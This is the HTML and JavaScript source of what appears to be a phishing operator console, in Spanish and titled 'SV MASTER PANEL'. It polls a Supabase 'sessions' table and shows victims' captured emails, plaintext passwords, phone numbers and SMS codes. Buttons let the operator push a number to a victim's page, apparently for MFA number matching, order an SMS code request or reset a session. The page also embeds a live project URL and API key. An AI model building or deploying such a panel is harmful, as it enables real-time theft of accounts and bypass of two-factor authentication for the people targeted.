<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SV MASTER PANEL</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body { background-color: #050505; color: #a1a1aa; font-family: 'Inter', sans-serif; }
        .card { background: #0f0f12; border: 1px solid #1f1f23; border-radius: 20px; }
        .input-num { background: #000; border: 1px solid #333; color: #fbbf24; font-weight: 900; text-align: center; }
    </style>
</head>
<body class="p-4">

    <div class="max-w-5xl mx-auto">
        <header class="flex justify-between items-center mb-8 pb-4 border-b border-zinc-900">
            <h1 class="text-white font-black italic">SV CONSOLE <span class="text-cyan-500">PRO</span></h1>
            <button onclick="clearDB()" class="text-red-500 text-[10px] font-bold uppercase border border-red-500/20 px-4 py-1 rounded-full">Limpiar Base</button>
        </header>

        <div id="list" class="grid gap-4 grid-cols-1 md:grid-cols-2 lg:grid-cols-3">
            <!-- Data -->
        </div>
    </div>

    <script>
        const S_URL = "https://eyrvplemxhnootpjzkav.supabase.co";
        const S_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV5cnZwbGVteGhub290cGp6a2F2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgyNTEwMDksImV4cCI6MjA4MzgyNzAwOX0.YxrnHYnBkQLqPuVH5izQdYYgL7GVZQgSG1h89sDVd0g";
        const client = supabase.createClient(S_URL, S_KEY);

        // Guardamos lo que se escribe para que no se borre al refrescar
        let localInputState = {};

        async function load() {
            const { data } = await client.from('sessions').select('*').order('updated_at', { ascending: false });
            const list = document.getElementById('list');
            if(!data || data.length === 0) { list.innerHTML = "<p class='col-span-full text-center py-20 opacity-20'>SIN CONEXIONES</p>"; return; }

            list.innerHTML = data.map(s => {
                // Si ya estamos escribiendo algo, mantenemos ese valor local
                const val = localInputState[s.session_id] !== undefined ? localInputState[s.session_id] : (s.target_num || '');

                return `
                <div class="card p-5 border-l-4 ${s.step === 'wait' ? 'border-l-yellow-500' : 'border-l-cyan-500'}">
                    <div class="flex justify-between items-start mb-4">
                        <div class="overflow-hidden">
                            <span class="text-[9px] font-bold text-zinc-500 uppercase">${s.step}</span>
                            <h2 class="text-white font-bold truncate">${s.email || 'Conectando...'}</h2>
                            <p class="text-xs text-zinc-600 font-mono">${s.password || '---'}</p>
                        </div>
                        <button onclick="delS('${s.session_id}')" class="text-zinc-800">Ã—</button>
                    </div>

                    <div class="bg-black/40 rounded-xl p-3 mb-4">
                        <div class="flex gap-2">
                            <input type="number" id="in-${s.session_id}" value="${val}" 
                                   oninput="localInputState['${s.session_id}']=this.value"
                                   placeholder="--" class="input-num w-16 p-2 text-xl rounded-lg outline-none">
                            <button onclick="sendNum('${s.session_id}')" class="flex-grow bg-blue-600 text-white font-bold rounded-lg text-xs uppercase">Enviar Num</button>
                        </div>
                    </div>

                    <div class="grid grid-cols-2 gap-2 mb-4">
                        <button onclick="goStep('${s.session_id}', 'sms')" class="bg-zinc-800 text-white py-2 rounded-lg text-[10px] font-black uppercase">Pedir SMS</button>
                        <button onclick="goStep('${s.session_id}', 'login')" class="bg-zinc-900 text-zinc-600 py-2 rounded-lg text-[10px] font-black uppercase">Reiniciar</button>
                    </div>

                    <div class="text-[10px] font-mono flex flex-col gap-1">
                        <span class="text-zinc-500">ðŸ“ž ${s.phone || 'Pendiente...'}</span>
                        <span class="text-cyan-500 font-bold italic">SMS: ${s.sms || '......'}</span>
                    </div>
                </div>
            `}).join('');
        }

        window.sendNum = async (id) => {
            const val = document.getElementById(`in-${id}`).value;
            await client.from('sessions').update({ target_num: val, step: 'wait', updated_at: new Date().toISOString() }).eq('session_id', id);
            delete localInputState[id]; // Limpiamos estado local tras enviar
            load();
        };

        window.goStep = async (id, step) => {
            await client.from('sessions').update({ step, updated_at: new Date().toISOString() }).eq('session_id', id);
            load();
        };

        window.delS = async (id) => { if(confirm('Borrar?')) await client.from('sessions').delete().eq('session_id', id); load(); };
        window.clearDB = async () => { if(confirm('Borrar todo?')) { const {data} = await client.from('sessions').select('session_id'); if(data) for(const r of data) await client.from('sessions').delete().eq('session_id', r.session_id); } load(); };

        setInterval(load, 3000);
        load();
    </script>
</body>
</html>
